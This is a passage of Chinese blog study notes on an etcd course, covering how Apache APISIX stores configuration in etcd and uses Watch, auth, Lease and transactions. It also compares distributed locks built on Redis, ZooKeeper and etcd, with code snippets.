class="hljs-number">2</span><br>&#123;<span class="hljs-string">&quot;update_time&quot;</span>:<span class="hljs-number">1614293361</span>,<span class="hljs-string">&quot;create_time&quot;</span>:<span class="hljs-number">1614293361</span>,<span class="hljs-string">&quot;upstream&quot;</span>:<br>&#123;<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;roundrobin&quot;</span>,<span class="hljs-string">&quot;nodes&quot;</span>:&#123;<span class="hljs-string">&quot;172.18.5.13:80&quot;</span>:<span class="hljs-number">1</span>&#125;,<span class="hljs-string">&quot;hash_on&quot;</span>:<span class="hljs-string">&quot;vars&quot;</span>,<span class="hljs-string">&quot;scheme&quot;</span>:<span class="hljs-string">&quot;http&quot;</span>,<span class="hljs-string">&quot;pass_host&quot;</span>:<span class="hljs-string">&quot;pass&quot;</span>&#125;,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>&#125;<br><br></code></pre></td></tr></table></figure><p>从中我们可以总结出如下信息：</p><ul><li>Apache APSIX 2.x系列版本使用的是etcd3。</li><li>服务、路由、ssl、插件等配置存储格式前缀是&#x2F;apisix + “&#x2F;“ + 功能特性类型（routes&#x2F;services&#x2F;ssl等），我们通过Admin API添加的路由、服务等配置就保存在相应的前缀下。</li><li>路由和服务配置的value是个Json对象，其中服务对象包含了id、负载均衡算法、后端节点、协议等信息。</li></ul><p>了解完Apache APISIX在etcd中的数据存储格式后，那么它是如何动态、近乎实时地感知到服务配置变化的呢？</p><h4 id="Watch机制的应用"><a href="#Watch机制的应用" class="headerlink" title="Watch机制的应用"></a>Watch机制的应用</h4><p>与Kubernetes一样，它们都是通过etcd的 <strong>Watch机制</strong> 来实现的。</p><p>Apache APISIX在启动的时候，首先会通过Range操作获取网关的配置、路由等信息，随后就通过Watch机制，获取增量变化事件。</p><p>使用Watch机制最容易犯错的地方是什么呢？</p><p>答案是不处理Watch返回的相关错误信息，比如已压缩ErrCompacted错误。Apache APISIX项目在从etcd v2中切换到etcd v3早期的时候，同样也犯了这个错误。</p><h4 id="鉴权机制的应用"><a href="#鉴权机制的应用" class="headerlink" title="鉴权机制的应用"></a>鉴权机制的应用</h4><p>除了Watch机制，Apache APISIX项目还使用了鉴权，毕竟配置网关是个高危操作，那它是如何使用etcd鉴权机制的呢？ <strong>etcd鉴权机制</strong> 中最容易踩的坑是什么呢？</p><p>答案是不复用client和鉴权token，频繁发起Authenticate操作，导致etcd高负载。正如之前介绍的，一个8核32G的高配节点在100个连接时，Authenticate QPS仅为8。可想而知，你如果不复用token，那么出问题就很自然不过了。</p><p>Apache APISIX是否也踩了这个坑呢？</p><p>Apache APISIX是基于Lua构建的，使用的是 <a href="https://github.com/api7/lua-resty-etcd/blob/master/lib/resty/etcd/v3.lua">lua-resty-etcd</a> 这个项目访问etcd，从相关 <a href="https://github.com/apache/apisix/issues/2899">issue</a> 反馈看，的确也踩了这个坑。社区用户反馈后，随后通过复用client、更完善的token复用机制解决了Authenticate的性能瓶颈，详细信息可参考 <a href="https://github.com/apache/apisix/pull/2932">PR 2932</a>、 <a href="https://github.com/api7/lua-resty-etcd/pull/100">PR 100</a>。</p><p>除了以上介绍的Watch机制、鉴权机制，Apache APISIX还使用了etcd的Lease特性和事务接口。</p><h4 id="Lease特性的应用"><a href="#Lease特性的应用" class="headerlink" title="Lease特性的应用"></a>Lease特性的应用</h4><p>为什么Apache APISIX项目需要Lease特性呢？</p><p>服务发现的核心工作原理是服务启动的时候将地址信息登录到注册中心，服务异常时自动从注册中心删除。</p><p>这是不是跟前面介绍的&lt;Lease特性: 如何检测客户端的存活性&gt;应用场景很匹配呢？</p><p>没错，Apache APISIX通过etcd v2的TTL特性、etcd v3的Lease特性来实现类似的效果，它提供的增加服务路由API，支持设置TTL属性，如下面所示：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># Create a route expires after 60 seconds, then it&#x27;s deleted automatically</span><br>$ curl http:<span class="hljs-string">//127.0.0.1</span><span class="hljs-function">:9080</span>/apisix/admin/routes/2?ttl=60 -H &#x27;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#x27; -X PUT -i -d &#x27;<br>&#123;<br>    <span class="hljs-string">&quot;uri&quot;</span>: <span class="hljs-string">&quot;/aa/index.html&quot;</span>,<br>    <span class="hljs-string">&quot;upstream&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;roundrobin&quot;</span>,<br>        <span class="hljs-string">&quot;nodes&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;39.97.63.215:80&quot;</span>: 1<br>        &#125;<br>    &#125;<br>&#125;&#x27;<br><br></code></pre></td></tr></table></figure><p>当一个路由设置非0 TTL后，Apache APISIX就会为它创建Lease，关联key，相关代码如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- lease substitute ttl in v3</span><br><span class="hljs-keyword">local</span> res, err<br><span class="hljs-keyword">if</span> ttl <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">local</span> data, grant_err = etcd_cli:<span class="hljs-keyword">grant</span>(tonumber(ttl))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">return</span> nil, grant_err<br>    <span class="hljs-keyword">end</span><br>    res, err = etcd_cli:<span class="hljs-keyword">set</span>(prefix .. key, <span class="hljs-keyword">value</span>, &#123;prev_kv = <span class="hljs-keyword">true</span>, lease = data.body.ID&#125;)<br><span class="hljs-keyword">else</span><br>    res, err = etcd_cli:<span class="hljs-keyword">set</span>(prefix .. key, <span class="hljs-keyword">value</span>, &#123;prev_kv = <span class="hljs-keyword">true</span>&#125;)<br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure><h4 id="事务特性的应用"><a href="#事务特性的应用" class="headerlink" title="事务特性的应用"></a>事务特性的应用</h4><p>介绍完Lease特性在Apache APISIX项目中的应用后，我们再来思考两个问题。为什么它还依赖etcd的事务特性呢？简单的执行put接口有什么问题？</p><p>答案是它跟Kubernetes是一样的使用目的。使用事务是为了防止并发场景下的数据写冲突，比如你可能同时发起两个Patch Admin API去修改配置等。如果简单地使用put接口，就会导致第一个写请求的结果被覆盖。</p><p>Apache APISIX是如何使用事务接口提供的乐观锁机制去解决并发冲突的问题呢？</p><p>核心依然是我们前面课程中一直强调的<strong>mod_revision</strong>，它会比较事务提交时的mod_revision与预期是否一致，一致才能执行put操作，Apache APISIX相关使用代码如下：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">local</span> <span class="hljs-built_in">compare</span> = &#123;<br>    &#123;<br>        <span class="hljs-built_in">key</span> = <span class="hljs-built_in">key</span>,<br>        target = <span class="hljs-string">&quot;MOD&quot;</span>,<br>        result = <span class="hljs-string">&quot;EQUAL&quot;</span>,<br>        mod_revision = mod_revision,<br>    &#125;<br>&#125;<br><span class="hljs-built_in">local</span> success = &#123;<br>    &#123;<br>        requestPut = &#123;<br>            <span class="hljs-built_in">key</span> = <span class="hljs-built_in">key</span>,<br>            value = value,<br>            lease = lease_id,<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">local</span> res, err = etcd_cli:txn(<span class="hljs-built_in">compare</span>, success)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">return</span> nil, err<br>end<br><br></code></pre></td></tr></table></figure><p>关于Apache APISIX事务特性的引入、背景以及更详细的实现，也可以参考 <a href="https://github.com/apache/apisix/pull/2216">PR 2216</a>。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>闪现介绍了服务部署架构的演进，从单体架构的缺陷开始、到分布式及微服务架构的诞生，分享了分布式及微服务架构中面临的一系列痛点（如服务发现，鉴权，安全，限速等等）。</p><p>而开源项目Apache APISIX正是一个基于etcd的项目，它为后端存储提供了一系列的解决方案，通过它的架构图为你介绍了其控制面和数据面的工作原理。</p><p>随后从数据存储格式、Watch机制、鉴权机制、Lease特性以及事务特性维度，分析了它们在Apache APISIX项目中的应用。</p><p>数据存储格式上，APISIX采用典型的prefix + 功能特性组织格式。key是相关配置id，value是个json对象，包含一系列业务所需要的核心数据。你需要注意的是Apache APISIX 1.x版本使用的etcd v2 API，2.x版本使用的是etcd v3 API，要求至少是etcd v3.4版本以上。</p><p>Watch机制上，APISIX依赖它进行配置的动态、实时更新，避免了传统的修改配置，需要服务重启等缺陷。</p><p>鉴权机制上，APISIX使用密码认证，进行多租户认证、授权，防止用户出现越权访问，保护网关服务的安全。</p><p>Lease及事务特性上，APISIX通过Lease来设置自动过期的路由规则，解决服务发现中的节点异常自动剔除等问题，通过事务特性的乐观锁机制来实现并发场景下覆盖更新等问题。</p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>假设老板让你去设计一个大型配置系统，满足公司各个业务场景的诉求，期望的设计目标如下：</p><ul><li>高可靠。配置系统的作为核心基础设施，期望可用性能达到99.99%。</li><li>高性能。公司业务多，规模大，配置系统应具备高性能、并能水平扩容。</li><li>支持多业务、多版本管理、多种发布策略。</li></ul><p>你认为etcd适合此业务场景吗？</p><p>答案1：</p><p>1.高可靠。etcd基于raft的多副本可以满足。</p><p> 2.高性能。公司业务多，规模大，可以依据不同业务不同etcd的方法，分担etcd的写压力，以及数据存储量有限的问题。各自业务的etcd可以水平扩展。 </p><p>3.支持多业务、多版本管理、多种发布策略。</p><p>etcd可以做到多版本管理，多发布策略的话，可以级联多个etcd的方法。 另外，可能更加理想的存储架构方式是采用计算与存储分离的方法，计算部分处理读写以及扩展，存储部分处理多版本，多业务，多发布策略。</p><p>答案2：</p><p>认为etcd并不合适，适合使用可平行扩容的分布式数据库如tidb，运维复杂度不更低点吗，容量也更大，还能支持各种key value大小配置</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>21.分布式锁：为什么基于etcd实现分布式锁比Redis锁更安全？</title>
    <link href="/2022/10/15/21-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9F%BA%E4%BA%8Eetcd%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E6%AF%94Redis%E9%94%81%E6%9B%B4%E5%AE%89%E5%85%A8%EF%BC%9F/"/>
    <url>/2022/10/15/21-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9F%BA%E4%BA%8Eetcd%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E6%AF%94Redis%E9%94%81%E6%9B%B4%E5%AE%89%E5%85%A8%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="21-分布式锁：为什么基于etcd实现分布式锁比Redis锁更安全？"><a href="#21-分布式锁：为什么基于etcd实现分布式锁比Redis锁更安全？" class="headerlink" title="21.分布式锁：为什么基于etcd实现分布式锁比Redis锁更安全？"></a>21.分布式锁：为什么基于etcd实现分布式锁比Redis锁更安全？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>在软件开发过程中，我们经常会遇到各种场景要求对共享资源进行互斥操作，否则整个系统的数据一致性就会出现问题。典型场景如商品库存操作、Kubernertes调度器为Pod分配运行的Node。</p><p>那要如何实现对共享资源进行互斥操作呢？</p><p>锁就是其中一个非常通用的解决方案。在单节点多线程环境，你使用本地的互斥锁就可以完成资源的互斥操作。然而单节点存在单点故障，为了保证服务高可用，你需要多节点部署。在多节点部署的分布式架构中，你就需要使用分布式锁来解决资源互斥操作了。</p><p>但是为什么有的业务使用了分布式锁还会出现各种严重超卖事故呢？分布式锁的实现和使用过程需要注意什么？</p><h2 id="从茅台超卖案例看分布式锁要素"><a href="#从茅台超卖案例看分布式锁要素" class="headerlink" title="从茅台超卖案例看分布式锁要素"></a>从茅台超卖案例看分布式锁要素</h2><p>首先我们从去年一个因Redis分布式锁实现问题导致 <a href="https://juejin.cn/post/6854573212831842311">茅台超卖案例</a> 说起，在这个真实案例中，因茅台的稀缺性，事件最终定级为P0级生产事故，后果影响严重。</p><p>那么它是如何导致超卖的呢？</p><p>首先简单介绍下此案例中的Redis简易分布式锁实现方案，它使用了Redis SET命令来实现。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">SET key value [EX seconds|<span class="hljs-type">PX</span> milliseconds|<span class="hljs-type">EXAT</span> timestamp|<span class="hljs-type">PXAT</span> milliseconds-timestamp|<span class="hljs-type">KEEPTTL</span>] [NX|<span class="hljs-type">XX</span>]<br>[GET]<br><br></code></pre></td></tr></table></figure><p>简单给你介绍下SET命令重点参数含义：</p><ul><li><code>EX</code> 设置过期时间，单位秒；</li><li><code>NX</code> 当key不存在的时候，才设置key；</li><li><code>XX</code> 当key存在的时候，才设置key。</li></ul><p>此业务就是基于Set key value EX 10 NX命令来实现的分布式锁，并通过JAVA的try-finally语句，执行Del key语句来释放锁，简易流程如下：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"># 对资源<span class="hljs-keyword">key</span>加锁，<span class="hljs-keyword">key</span>不存在时创建，并且设置，<span class="hljs-number">10</span>秒自动过期<br><span class="hljs-keyword">SET</span> <span class="hljs-keyword">key</span> value EX <span class="hljs-number">10</span> NX<br>业务逻辑流程<span class="hljs-number">1</span>，校验用户身份<br>业务逻辑流程<span class="hljs-number">2</span>，查询并校验库存(<span class="hljs-keyword">get</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">compare</span>)<br>业务逻辑流程<span class="hljs-number">3</span>，库存&gt;<span class="hljs-number">0</span>，扣减库存(Decr stock)，生成秒杀茅台订单<br><br># 释放锁<br>Del <span class="hljs-keyword">key</span><br><br></code></pre></td></tr></table></figure><p>以上流程中其实存在以下思考点:</p><ul><li>NX参数有什么作用?</li><li>为什么需要原子的设置key及过期时间？</li><li>为什么基于Set key value EX 10 NX命令还出现了超卖呢?</li><li>为什么大家都比较喜欢使用Redis作为分布式锁实现？</li></ul><p>首先来看第一个问题，NX参数的作用。NX参数是为了保证当分布式锁不存在时，只有一个client能写入此key成功，获取到此锁。我们使用分布式锁的目的就是希望在高并发系统中，有一种互斥机制来防止彼此相互干扰，保证数据的一致性。</p><p><strong>因此分布式锁的第一核心要素就是互斥性、安全性。在同一时间内，不允许多个client同时获得锁。</strong></p><p>再看第二个问题，假设我们未设置key自动过期时间，在Set key value NX后，如果程序crash或者发生网络分区后无法与Redis节点通信，毫无疑问其他client将永远无法获得锁。这将导致死锁，服务出现中断。</p><p>有的同学意识到这个问题后，使用如下SETNX和EXPIRE命令去设置key和过期时间，这也是不正确的，因为你无法保证SETNX和EXPIRE命令的原子性。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta"># 对资源key加锁，key不存在时创建</span><br>SETNX <span class="hljs-built_in">key</span> value<br><span class="hljs-meta"># 设置KEY过期时间</span><br>EXPIRE <span class="hljs-built_in">key</span> <span class="hljs-number">10</span><br>业务逻辑流程<br><br><span class="hljs-meta"># 释放锁</span><br>Del <span class="hljs-built_in">key</span><br><br></code></pre></td></tr></table></figure><p><strong>这就是分布式锁第二个核心要素，活性。在实现分布式锁的过程中要考虑到client可能会出现crash或者网络分区，你需要原子申请分布式锁及设置锁的自动过期时间，通过过期、超时等机制自动释放锁，避免出现死锁，导致业务中断。</strong></p><p>再看第三个问题，为什么使用了Set key value EX 10 NX命令，还出现了超卖呢？</p><p>原来是抢购活动开始后，加锁逻辑中的业务流程1访问的用户身份服务出现了高负载，导致阻塞在校验用户身份流程中(超时30秒)，然而锁10秒后就自动过期了，因此其他client能获取到锁。关键是阻塞的请求执行完后，它又把其他client的锁释放掉了，导致进入一个恶性循环。</p><p>因此申请锁时，写入的value应确保唯一性（随机值等）。client在释放锁时，应通过Lua脚本原子校验此锁的value与自己写入的value一致，若一致才能执行释放工作。</p><p>更关键的是库存校验是通过get and compare方式，它压根就无法防止超卖。正确的解决方案应该是通过LUA脚本实现Redis比较库存、扣减库存操作的原子性（或者在每次只能抢购一个的情况下，通过判断 <a href="https://redis.io/commands/DECR">Redis Decr命令</a> 的返回值即可。此命令会返回扣减后的最新库存，若小于0则表示超卖）。</p><p><strong>从这个问题中我们可以看到，分布式锁实现具备一定的复杂度，它不仅依赖存储服务提供的核心机制，同时依赖业务领域的实现。无论是遭遇高负载、还是宕机、网络分区等故障，都需确保锁的互斥性、安全性，否则就会出现严重的超卖生产事故。</strong></p><p>再看最后一个问题，为什么大家都比较喜欢使用Redis做分布式锁的实现呢?</p><p>考虑到在秒杀等业务场景上存在大量的瞬间、高并发请求，加锁与释放锁的过程应是高性能、高可用的。而Redis核心优点就是<strong>快、简单</strong>，是随处可见的基础设施，部署、使用也及其方便，因此广受开发者欢迎。</p><p><strong>这就是分布式锁第三个核心要素，高性能、高可用。加锁、释放锁的过程性能开销要尽量低，同时要保证高可用，确保业务不会出现中断。</strong></p><p>那么除了以上案例中人为实现问题导致的锁不安全因素外，基于Redis实现的以上分布式锁还有哪些安全性问题呢？</p><h2 id="Redis分布式锁问题"><a href="#Redis分布式锁问题" class="headerlink" title="Redis分布式锁问题"></a>Redis分布式锁问题</h2><p>我们从茅台超卖案例中为你总结出的分布式核心要素（<strong>互斥性、安全性、活性、高可用、高性能</strong>）说起。</p><p>首先，如果我们的分布式锁跑在单节点的Redis Master节点上，那么它就存在单点故障，无法保证分布式锁的高可用。</p><p>于是我们需要一个主备版的Redis服务，至少具备一个Slave节点。</p><p>我们又知道Redis是基于主备异步复制协议实现的Master-Slave数据同步，如下图所示，若client A执行SET key value EX 10 NX命令，redis-server返回给client A成功后，Redis Master节点突然出现crash等异常，这时候Redis Slave节点还未收到此命令的同步。</p><p><img src="/images/350285/cd3d4ab1af45c6eb76e7dccd9c666245.png"></p><p>若你部署了Redis Sentinel等主备切换服务，那么它就会以Slave节点提升为主，此时Slave节点因并未执行SET key value EX 10 NX命令，因此它收到client B发起的加锁的此命令后，它也会返回成功给client。</p><p>那么在同一时刻，集群就出现了两个client同时获得锁，分布式锁的互斥性、安全性就被破坏了。</p><p>除了主备切换可能会导致基于Redis实现的分布式锁出现安全性问题，在发生网络分区等场景下也可能会导致出现脑裂，Redis集群出现多个Master，进而也会导致多个client同时获得锁。</p><p>如下图所示，Master节点在可用区1，Slave节点在可用区2，当可用区1和可用区2发生网络分区后，部署在可用区2的Redis Sentinel服务就会将可用区2的Slave提升为Master，而此时可用区1的Master也在对外提供服务。因此集群就出现了脑裂，出现了两个Master，都可对外提供分布式锁申请与释放服务，分布式锁的互斥性被严重破坏。</p><p><img src="/images/350285/cb4cb52cf2244d2000884ef5f5ff3db1.png"></p><p><strong>主备切换、脑裂是Redis分布式锁的两个典型不安全的因素，本质原因是Redis为了满足高性能，采用了主备异步复制协议，同时也与负责主备切换的Redis Sentinel服务是否合理部署有关。</strong></p><p>有没有其他方案解决呢？</p><p>当然有，Redis作者为了解决SET key value [EX] 10 [NX]命令实现分布式锁不安全的问题，提出了 <a href="https://redis.io/topics/distlock">RedLock算法</a>。它是基于多个独立的Redis Master节点的一种实现（一般为5）。client依次向各个节点申请锁，若能从多数个节点中申请锁成功并满足一些条件限制，那么client就能获取锁成功。</p><p>它通过独立的N个Master节点，避免了使用主备异步复制协议的缺陷，只要多数Redis节点正常就能正常工作，显著提升了分布式锁的安全性、可用性。</p><p>但是，它的实现建立在一个不安全的系统模型上的，它依赖系统时间，当时钟发生跳跃时，也可能会出现安全性问题。你要有兴趣的话，可以详细阅读下分布式存储专家Martin对 <a href="https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html">RedLock的分析文章</a>，Redis作者的也专门写了 <a href="http://antirez.com/news/101">一篇文章进行了反驳</a>。</p><h2 id="分布式锁常见实现方案"><a href="#分布式锁常见实现方案" class="headerlink" title="分布式锁常见实现方案"></a>分布式锁常见实现方案</h2><p>了解完Redis分布式锁的一系列问题和实现方案后，我们再看看还有哪些典型的分布式锁实现。</p><p>除了Redis分布式锁，其他使用最广的应该是ZooKeeper分布式锁和etcd分布式锁。</p><p>ZooKeeper也是一个典型的分布式元数据存储服务，它的分布式锁实现基于ZooKeeper的临时节点和顺序特性。</p><p>首先什么是临时节点呢？</p><p>临时节点具备数据自动删除的功能。当client与ZooKeeper连接和session断掉时，相应的临时节点就会被删除。</p><p>其次ZooKeeper也提供了Watch特性可监听key的数据变化。</p><p><a href="https://www.usenix.org/legacy/event/atc10/tech/full_papers/Hunt.pdf">使用Zookeeper加锁的伪代码如下</a>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">Lock<br><span class="hljs-number">1</span> n = create(l + “/lock-”, EPHEMERAL|SEQUENTIAL)<br><span class="hljs-number">2</span> C = getChildren(l, false)<br><span class="hljs-number">3</span> <span class="hljs-keyword">if</span> n is lowest znode <span class="hljs-keyword">in</span> C, <span class="hljs-keyword">exit</span><br><span class="hljs-number">4</span> p = znode <span class="hljs-keyword">in</span> C ordered just before n<br><span class="hljs-number">5</span> <span class="hljs-keyword">if</span> exists(p, true) wait <span class="hljs-keyword">for</span> watch event<br><span class="hljs-number">6</span> goto <span class="hljs-number">2</span><br>Unlock<br><span class="hljs-number">1</span> <span class="hljs-keyword">delete</span>(n)<br><br></code></pre></td></tr></table></figure><p>接下来重点介绍一下基于etcd的分布式锁实现。</p><h2 id="etcd分布式锁实现"><a href="#etcd分布式锁实现" class="headerlink" title="etcd分布式锁实现"></a>etcd分布式锁实现</h2><p>那么基于etcd实现的分布式锁是如何确保安全性、互斥性、活性的呢？</p><h3 id="事务与锁的安全性"><a href="#事务与锁的安全性" class="headerlink" title="事务与锁的安全性"></a>事务与锁的安全性</h3><p>从Redis案例中我们可以看到，加锁的过程需要确保安全性、互斥性。比如，当key不存在时才能创建，否则查询相关key信息，而etcd提供的事务能力正好可以满足我们的诉求。</p><p>正如之前介绍的事务特性，它由IF语句、Then语句、Else语句组成。其中在IF语句中，支持比较key的是<strong>修改版本号mod_revision和创建版本号create_revision</strong>。</p><p>在分布式锁场景，你就可以通过key的创建版本号create_revision来检查key是否已存在，因为一个key不存在的话，它的create_revision版本号就是0。</p><p>若create_revision是0，就可发起put操作创建相关key，具体代码如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">txn := client.<span class="hljs-built_in">Txn</span>(ctx).<span class="hljs-built_in">If</span>(v3.<span class="hljs-built_in">Compare</span>(v3.<span class="hljs-built_in">CreateRevision</span>(k),<br><span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0</span>))<br><br></code></pre></td></tr></table></figure><p>要注意的是，实现分布式锁的方案有多种，比如你可以通过client是否成功创建一个固定的key，来判断此client是否获得锁，你也可以通过多个client创建prefix相同，名称不一样的key，<strong>哪个key的revision最小，最终就是它获得锁。（解决惊群效应的方式之一）</strong>。</p><p>相比Redis基于主备异步复制导致锁的安全性问题，etcd是基于<strong>Raft共识算法</strong>实现的，一个写请求需要经过集群多数节点确认。因此一旦分布式锁申请返回给client成功后，它一定是持久化到了集群多数节点上，不会出现Redis主备异步复制可能导致丢数据的问题，具备更高的安全性。</p><h3 id="Lease与锁的活性"><a href="#Lease与锁的活性" class="headerlink" title="Lease与锁的活性"></a>Lease与锁的活性</h3><p>通过事务实现原子的检查key是否存在、创建key后，我们确保了分布式锁的安全性、互斥性。那么etcd是如何确保锁的活性呢? 也就是发生任何故障，都可避免出现死锁呢？</p><p>正如在租约特性中介绍的，Lease就是一种活性检测机制，它提供了检测各个客户端存活的能力。你的业务client需定期向etcd服务发送”特殊心跳”汇报健康状态，若你未正常发送心跳，并超过和etcd服务约定的最大存活时间后，就会被etcd服务移除此Lease和其关联的数据。</p><p>通过Lease机制就优雅地解决了client出现crash故障、client与etcd集群网络出现隔离等各类故障场景下的死锁问题。一旦超过Lease TTL，它就能自动被释放，确保了其他client在TTL过期后能正常申请锁，保障了业务的可用性。</p><p>具体代码如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">txn := client.<span class="hljs-built_in">Txn</span>(ctx).<span class="hljs-built_in">If</span>(v3.<span class="hljs-built_in">Compare</span>(v3.<span class="hljs-built_in">CreateRevision</span>(k), <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0</span>))<br>txn = txn.<span class="hljs-built_in">Then</span>(v3.<span class="hljs-built_in">OpPut</span>(k, val, v3.<span class="hljs-built_in">WithLease</span>(s.<span class="hljs-built_in">Lease</span>())))<br>txn = txn.<span class="hljs-built_in">Else</span>(v3.<span class="hljs-built_in">OpGet</span>(k))<br>resp, err := txn.<span class="hljs-built_in">Commit</span>()<br>if err != nil &#123;<br>    return err<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Watch与锁的可用性"><a href="#Watch与锁的可用性" class="headerlink" title="Watch与锁的可用性"></a>Watch与锁的可用性</h3><p>当一个持有锁的client crash故障后，其他client如何快速感知到此锁失效了，快速获得锁呢，最大程度降低锁的不可用时间呢？</p><p>答案是<strong>Watch</strong>特性。正如在Watch特性中和介绍的，Watch提供了高效的数据监听能力。当其他client收到Watch Delete事件后，就可快速判断自己是否有资格获得锁，极大减少了锁的不可用时间。</p><p>具体代码如下所示：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">var</span> wr v3.WatchResponse<br>wch := client.Watch(cctx, <span class="hljs-built_in">key</span>, v3.WithRev(rev))<br><span class="hljs-keyword">for</span> wr = <span class="hljs-built_in">range</span> wch &#123;<br>   <span class="hljs-keyword">for</span> <span class="hljs-symbol">_</span>, <span class="hljs-built_in">ev</span> := <span class="hljs-built_in">range</span> wr.Events &#123;<br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">ev</span>.Type == mvccpb.DELETE &#123;<br>         <span class="hljs-built_in">return</span> nil<br>      &#125;<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="etcd自带的concurrency包"><a href="#etcd自带的concurrency包" class="headerlink" title="etcd自带的concurrency包"></a>etcd自带的concurrency包</h3><p>为了简化分布式锁、分布式选举、分布式事务的实现，etcd社区提供了一个名为concurrency包实现更简单、正确地使用分布式锁、分布式选举。</p><p>下面简单介绍下分布式锁 <a href="https://github.com/etcd-io/etcd/tree/v3.4.9/clientv3/concurrency">concurrency</a> 包的使用和实现，它的使用非常简单，如下代码所示，核心流程如下：</p><ul><li>首先通过concurrency.NewSession方法创建Session，本质是创建了一个TTL为10的Lease。</li><li>其次得到session对象后，通过concurrency.NewMutex创建了一个mutex对象，包含Lease、key prefix等信息。</li><li>然后通过mutex对象的Lock方法尝试获取锁。</li><li>最后使用结束，可通过mutex对象的Unlock方法释放锁。</li></ul><figure class="highlight stata"><table><tr><td 